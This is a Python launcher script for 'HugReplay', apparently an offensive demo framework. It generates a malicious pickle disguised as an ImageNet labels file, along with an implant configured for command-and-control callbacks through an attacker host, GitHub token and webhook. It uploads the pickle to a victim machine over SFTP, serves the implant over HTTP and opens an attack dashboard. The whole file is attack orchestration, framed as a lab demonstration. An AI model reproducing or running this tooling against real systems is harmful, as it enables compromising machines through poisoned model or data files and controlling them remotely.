#!/usr/bin/env python3
"""
HugReplay — One-Click Demo Launcher

Automates all setup steps:
  1. Generates malicious pickle + implant
  2. Uploads pickle to victim via SFTP
  3. Starts implant HTTP server (background thread)
  4. Starts Flask dashboard (subprocess)
  5. Opens browser

Then just click "Launch Attack" in the dashboard.

Usage:
    python3 demo.py
    python3 demo.py --config config.yaml
    python3 demo.py --no-browser          # skip auto-open
"""

import argparse
import http.server
import os
import signal
import socketserver
import subprocess
import sys
import threading
import time
import webbrowser
from pathlib import Path

import yaml


def load_config(path: str) -> dict:
    with open(path) as f:
        return yaml.safe_load(f)


def resolve_attacker_host(cfg: dict) -> str:
    """attacker_host overrides attacker_ip for implant C2 callbacks (can be domain or IP)."""
    return cfg["lab"].get("attacker_host") or cfg["lab"]["attacker_ip"]


def generate_artifacts(cfg: dict, out_dir: str) -> str:
    """Generate pickle + implant. Returns path to pickle."""
    sys.path.insert(0, str(Path(__file__).parent))
    from attacker.techniques.dataset_poison import generate_pickle, generate_implant

    attacker_host = resolve_attacker_host(cfg)
    attacker_port = cfg["lab"].get("attacker_port", 8080)

    Path(out_dir).mkdir(parents=True, exist_ok=True)
    serve_dir = Path(out_dir) / "serve"
    serve_dir.mkdir(exist_ok=True)

    pkl_path = str(Path(out_dir) / "imagenet_labels.pkl")
    generate_pickle(pkl_path, attacker_host, attacker_port)

    github_token = cfg.get("c2", {}).get("github_token", "")
    webhook_url = cfg.get("c2", {}).get("webhook_url", "")
    implant_src = generate_implant(attacker_host, "__GIST_ID__", webhook_url)
    implant_path = serve_dir / "implant.py"
    with open(implant_path, "w") as f:
        f.write(implant_src)

    print(f"  pickle  → {pkl_path}")
    print(f"  implant → {implant_path}")
    return pkl_path


def scp_to_victim(cfg: dict, local_path: str, remote_path: str = "/tmp/imagenet_labels.pkl") -> None:
    """Upload pickle to victim via paramiko SFTP."""
    import os as _os
    from attacker.c2.victim_shell import VictimShell

    lab = cfg["lab"]
    key_path = lab.get("victim_ssh_key") or None
    if key_path:
        key_path = _os.path.expanduser(key_path)

    shell = VictimShell(
        host=lab["victim_ip"],
        user=lab.get("victim_user", "ubuntu"),
        key_path=key_path,
        password=lab.get("victim_password") or None,
    )
    shell.connect()
    sftp = shell._client.open_sftp()
    sftp.put(local_path, remote_path)
    sftp.close()
    shell.disconnect()
    print(f"  uploaded → {lab['victim_ip']}:{remote_path}")


def start_http_server(serve_dir: str, port: int = 8080) -> socketserver.TCPServer:
    """Start HTTP server in a daemon thread. Returns server for cleanup."""
    class _Handler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory=serve_dir, **kwargs)
        def log_message(self, fmt, *args):
            print(f"  [HTTP] {fmt % args}")

    # Allow address reuse so restarts don't fail
    socketserver.TCPServer.allow_reuse_address = True
    server = socketserver.TCPServer(("0.0.0.0", port), _Handler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    print(f"  http server on :{port}  →  {serve_dir}")
    return server


def start_dashboard(config_path: str) -> subprocess.Popen:
    """Start Flask dashboard as a subprocess."""
    proc = subprocess.Popen(
        [sys.executable, "dashboard/app.py", "--config", config_path],
        stdout=sys.stdout,
        stderr=sys.stderr,
    )
    time.sleep(2)  # Let Flask bind
    return proc


def main():
    parser = argparse.ArgumentParser(description="HugReplay — one-click demo launcher")
    parser.add_argument("--config", default="config.yaml")
    parser.add_argument("--no-browser", action="store_true", help="Skip auto-open browser")
    parser.add_argument("--no-scp", action="store_true", help="Skip SCP to victim (if already copied)")
    args = parser.parse_args()

    print("\n╔══════════════════════════════════════════╗")
    print("║  HugReplay — One-Click Demo Launcher     ║")
    print("╚══════════════════════════════════════════╝\n")

    if not os.path.exists(args.config):
        print(f"[!] config.yaml not found at '{args.config}'")
        print("    Copy config.example.yaml to config.yaml and fill in your lab details.")
        sys.exit(1)

    cfg = load_config(args.config)
    out_dir = "/tmp/hugreplay"
    serve_dir = str(Path(out_dir) / "serve")
    attacker_ip = cfg["lab"]["attacker_ip"]
    dashboard_port = cfg.get("dashboard", {}).get("port", 5001)

    # --- Step 1: Generate artifacts ---
    print("[1/4] Generating malicious artifacts...")
    pkl_path = generate_artifacts(cfg, out_dir)

    # --- Step 2: Upload pickle to victim ---
    if not args.no_scp:
        print("[2/4] Uploading pickle to victim...")
        try:
            scp_to_victim(cfg, pkl_path)
        except Exception as e:
            print(f"  [!] SCP failed: {e}")
            print("      Copy manually: scp /tmp/hugreplay/imagenet_labels.pkl ubuntu@<victim>:/tmp/")
    else:
        print("[2/4] Skipping SCP (--no-scp)")

    # --- Step 3: Start implant HTTP server ---
    print("[3/4] Starting implant HTTP server...")
    start_http_server(serve_dir)

    # --- Step 4: Start dashboard ---
    print("[4/4] Starting dashboard...")
    dashboard_proc = start_dashboard(args.config)

    dashboard_url = f"http://{attacker_ip}:{dashboard_port}"
    print(f"\n✓  All ready.")
    print(f"   Dashboard : {dashboard_url}")
    print(f"   → Click 'Launch Attack' to start\n")
    print("   Ctrl+C to stop everything.\n")

    if not args.no_browser:
        try:
            webbrowser.open(dashboard_url)
        except Exception:
            pass

    # Keep alive until dashboard exits or Ctrl+C
    def _handle_signal(sig, frame):
        print("\n[Demo] Stopping...")
        dashboard_proc.terminate()
        sys.exit(0)

    signal.signal(signal.SIGINT, _handle_signal)
    signal.signal(signal.SIGTERM, _handle_signal)

    dashboard_proc.wait()


if __name__ == "__main__":
    main()
